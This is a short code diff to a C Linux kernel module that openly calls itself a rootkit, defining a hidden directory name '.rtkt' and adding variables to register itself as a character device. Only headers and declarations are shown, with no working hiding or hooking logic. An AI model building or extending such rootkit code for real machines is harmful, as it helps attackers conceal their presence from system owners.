@@ -10,6 +10,8 @@
 #include <linux/uaccess.h>
 #include <asm/errno.h>
 #include <linux/kallsyms.h>
+#include <linux/kdev_t.h>
+#include <linux/cdev.h>
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 
@@ -17,6 +19,12 @@
 #define HIDDEN_DIR ".rtkt"
 #define TEST_MSG "Inserting Rootkit"
 #define MSG_BUF_LEN 100
+
+//Defs for auto insert into devfs
+static struct cdev root_kit;
+static int init_val;
+static struct class *cl;
+static dev_t first_dev_num;
 
 //Device function declerations
 static int rootkit_load(void);
